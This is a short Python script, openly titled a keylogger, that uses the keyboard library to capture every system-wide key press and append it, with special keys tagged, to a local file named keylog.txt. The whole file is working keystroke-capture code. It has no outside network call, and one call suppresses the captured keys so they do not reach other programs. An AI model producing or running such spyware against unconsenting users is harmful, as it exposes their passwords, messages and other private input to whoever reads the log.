# keylogger.py

import keyboard  # Importing the keyboard library for key logging
import time
from datetime import datetime

def write_to_file(log_file, data):
    """Write the logged data to a file."""
    with open(log_file, "a") as file:
        file.write(data)

def keylogger():
    """Capture keystrokes and log them."""
    log_file = "keylog.txt"
    print(f"Keylogger started. Logs are being saved to {log_file}")
    write_to_file(log_file, f"\n\nKeylogger started at {datetime.now()}\n")
    
    while True:
        event = keyboard.read_event(suppress=True)
        if event.event_type == "down":  # Log only key press (not release)
            key = event.name
            if key == "space":  # Replace "space" with an actual space
                key = " "
            elif key == "enter":  # Replace "enter" with a newline
                key = "\n"
            elif len(key) > 1:  # Format special keys (like shift, ctrl)
                key = f"[{key.upper()}]"
            write_to_file(log_file, key)
        
        time.sleep(0.01)  # Add a slight delay to avoid overloading CPU

if __name__ == "__main__":
    try:
        keylogger()
    except KeyboardInterrupt:
        print("\nKeylogger stopped.")
